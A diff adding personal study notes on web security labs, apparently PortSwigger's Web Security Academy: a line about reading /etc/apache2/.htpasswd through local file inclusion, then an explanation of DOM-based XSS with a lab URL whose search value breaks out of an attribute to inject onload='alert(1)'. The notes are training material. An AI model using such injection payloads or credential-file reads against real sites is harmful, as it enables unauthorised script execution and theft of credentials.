@@ -369,5 +369,23 @@ it displays in view-source:
 
 
 !!We can finally find /etc/apache2/.htpasswd (LFI)
+_______________________________________________________________________________________________________________________________________________________________________________________________
+Dom based XSS
+--------------
+View page source > cannot see > dom manipulation > can see only website display 
+
+<h1>0 search results for 'test'</h1>
+
+Inspect > can see > both dom manipulation & website display
+
+<h1>0 search results for 'test'</h1>
+<img src="/resources/images/tracker.gif?searchTerms=test">
+
+
+Dom based XSS > add additional attribute (onload)
+
+https://0a3c008203a264fa83da39b2006200c5.web-security-academy.net/?search=test" onload="alert(1)
+
+ 
 
 
